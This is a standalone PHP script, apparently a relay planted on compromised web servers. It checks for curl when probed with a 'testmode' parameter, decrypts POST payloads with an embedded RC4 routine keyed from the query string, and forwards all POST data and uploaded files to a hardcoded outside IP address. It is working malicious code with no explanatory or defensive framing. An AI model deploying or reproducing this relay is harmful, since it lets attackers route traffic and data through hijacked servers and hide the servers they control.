<?php

$to_addr = '95.128.182.22';
$to_port = false; //or FALSE

if (isset($_GET['testmode']))
  {
  if (function_exists('curl_init'))
    die('ok');
    else
    die('no');
  }


if (!function_exists('curl_init'))
  die('no');

class crypt
    {
    var $data;

    function hexToStr($hex)
        {
        $string='';
        for ($i=0; $i < strlen($hex)-1; $i+=2)
            {
            $string .= chr(hexdec($hex[$i].$hex[$i+1]));
            }
            return $string;
        }

    function Decode($key) 
	{
	if (strlen($key) < 1)
	  return false;
	$this->data = $this->hexToStr($this->data);
	$s = array();
	for ($i=0; $i<256; $i++) 
	  {
	  $s[$i] = $i;
	  }
	$j = 0;
	$x;
	for ($i=0; $i<256; $i++) 
	  {
	  $j = ($j + $s[$i] + ord($key[$i % strlen($key)])) % 256;
	  $x = $s[$i];
	  $s[$i] = $s[$j];
	  $s[$j] = $x;
	  }
	$i = 0;
	$j = 0;
	$ct = '';
	$y;
	for ($y=0; $y<strlen($this->data); $y++) 
	  {
	  $i = ($i + 1) % 256;
	  $j = ($j + $s[$i]) % 256;
	  $x = $s[$i];
	  $s[$i] = $s[$j];
	  $s[$j] = $x;
	  $ct .= $this->data[$y] ^ chr($s[($s[$i] + $s[$j]) % 256]);
	  }

	$this->data = $ct;
	unset($ct);
	}

    function Encode($key) 
	{
	$s = array();
	for ($i=0; $i<256; $i++) 
	  {
	  $s[$i] = $i;
	  }
	$j = 0;
	$x;
	for ($i=0; $i<256; $i++) 
	  {
	  $j = ($j + $s[$i] + ord($key[$i % strlen($key)])) % 256;
	  $x = $s[$i];
	  $s[$i] = $s[$j];
	  $s[$j] = $x;
	  }
	$i = 0;
	$j = 0;
	$ct = '';
	$y;
	for ($y=0; $y<strlen($this->data); $y++) 
	  {
	  $i = ($i + 1) % 256;
	  $j = ($j + $s[$i]) % 256;
	  $x = $s[$i];
	  $s[$i] = $s[$j];
	  $s[$j] = $x;
	  $d = dechex(ord($this->data[$y]) ^ ($s[($s[$i] + $s[$j]) % 256]));
	  $ct .= (strlen($d) == 1) ? '0'.$d : $d;
	  }

	$this->data = $ct;
	unset($ct);
	}

    function PrepareData($data)
	{
	$this->data = $data;
	}

    }

$post_data = isset($_POST) ? $_POST : false;
$get_data = isset($_GET) ? $_GET : false;
$inp_data = false;

foreach($get_data AS $k=>$v)
  $inp_data = $v;

if ($post_data && $get_data && $inp_data)
  {
  if (!preg_match("/^[a-z0-9]{10,15}$/", $inp_data))
    die();

  $data_found = false;
  $pd = array();
  foreach ($post_data as $key => $value)
    {
      if (preg_match("/^[a-fA-F0-9]{70,}$/", $value))
	$data_found = $value;
      $pd[] = stripslashes($key).'='.stripslashes($value);
    }

  if ($data_found === false)
    die();

  $kkk = '';
  $k_arr = str_split($inp_data);
  sort($k_arr);
  $k_size = sizeOf($k_arr);
  for($q=0;$q<$k_size;$q++) $kkk .= $k_arr[$q];

  $crypt = new crypt();
  $crypt->PrepareData($data_found);
  $crypt->Decode($kkk);
  $ndata = $crypt->data;
  echo "CRYPT: !".$crypt;
  if ($ndata[0] != '{' || $ndata[strlen($ndata)-1] != '}')
    die();
  
  $ndata = trim($ndata, '{}');
  $narr = explode('|', $ndata);

  if (!preg_match("/^[0-9]$/", $narr[0]) || !preg_match("/^[a-zA-Z0-9]{4,20}$/", $narr[1]) || !preg_match("/^[a-fA-F0-9]{32}$/", $narr[2]))
    die();

  $post_string = join("&", $pd);

  $ch = curl_init();

  if (count($_FILES) > 0)
    {
    foreach($_FILES AS $kq=>$vq) { $upfile = $kq; break; }
    if (isset($upfile))
      $post_data[$upfile] = '@'. $_FILES[$upfile]['tmp_name'].';filename='.$_FILES[$upfile]['name'].';type='.$_FILES[$upfile]['type'];
    }

  curl_setopt($ch, CURLOPT_URL, $to_addr.'/'.$inp_data);
  if ($to_port !== false)
    curl_setopt($ch, CURLOPT_PORT, $to_port);
//  curl_setopt($ch, CURLOPT_POST, count($pd));
//  curl_setopt($ch, CURLOPT_POSTFIELDS, $post_string);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);

  curl_setopt($ch, CURLOPT_HEADER, FALSE);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, FALSE);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);

  $result = curl_exec($ch);
  curl_close($ch);
  }


?>
